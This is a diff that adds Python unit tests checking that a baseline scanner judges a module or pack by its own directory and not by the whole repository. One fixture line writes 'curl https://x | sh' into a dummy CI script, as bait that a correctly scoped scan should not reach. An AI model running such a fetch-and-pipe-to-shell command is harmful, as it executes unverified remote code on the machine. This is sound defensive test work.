@@ -92,6 +92,52 @@ class CheckEntriesTests(unittest.TestCase):
         self.assertTrue(any("no id" in p for p in check.compare(entry(declaration={"title": "x"}), fetched, "module")))
 
 
+class BaselineScopeTests(unittest.TestCase):
+    """What the baseline is pointed at. An entry is a module or a pack, never a repository."""
+
+    def tree(self, temp):
+        root = Path(temp)                       # stands in for a fetched repository snapshot
+        (root / "src").mkdir()
+        (root / "src" / "ci.sh").write_text("curl https://x | sh\n", encoding="utf-8")
+        for name in ("hello-zm", "hello-zm-two"):
+            (root / "examples" / name).mkdir(parents=True)
+            (root / "examples" / name / "module.json").write_text("{}", encoding="utf-8")
+        pack = root / "examples" / "hello-pack"
+        pack.mkdir()
+        (pack / "composition.json").write_text(json.dumps({"modules": ["../hello-zm", "../hello-zm-two"]}), encoding="utf-8")
+        return root, pack
+
+    def test_a_module_is_judged_by_its_own_directory_not_its_repository(self):
+        # Regression: the scan walked up one level per path part, landing on the repository root, so
+        # an entry in examples/ was reported with the repository's tests, CI and vendored files.
+        with tempfile.TemporaryDirectory() as temp:
+            root, _ = self.tree(temp)
+            e = entry(path="examples/hello-zm")
+            scanned, scope = check.baseline_root(e, root / "examples" / "hello-zm")
+            self.assertEqual(scanned, root / "examples" / "hello-zm")
+            self.assertEqual(scope, "module directory")
+
+    def test_a_pack_is_judged_with_the_members_it_names_and_no_more(self):
+        with tempfile.TemporaryDirectory() as temp:
+            root, pack = self.tree(temp)
+            e = entry(kind="composition", path="examples/hello-pack")
+            scanned, scope = check.baseline_root(e, pack)
+            self.assertEqual(scanned.resolve(), (root / "examples").resolve(), "the members sit beside it")
+            self.assertIn("members", scope)
+            self.assertNotEqual(scanned.resolve(), root.resolve(), "and not the whole repository")
+
+    def test_a_pack_whose_members_are_references_or_unreadable_stays_in_its_own_directory(self):
+        with tempfile.TemporaryDirectory() as temp:
+            _, pack = self.tree(temp)
+            e = entry(kind="composition", path="examples/hello-pack")
+            (pack / "composition.json").write_text(json.dumps({"modules": ["someone/elsewhere@" + "a" * 40]}), encoding="utf-8")
+            self.assertEqual(check.baseline_root(e, pack), (pack, "pack directory"))
+            (pack / "composition.json").write_text("{not json", encoding="utf-8")
+            scanned, scope = check.baseline_root(e, pack)
+            self.assertEqual(scanned, pack)
+            self.assertIn("could not be read", scope)
+
+
 class BaselineRowTests(unittest.TestCase):
     def test_outcomes_decide_and_claims_are_checked(self):
         e = entry()
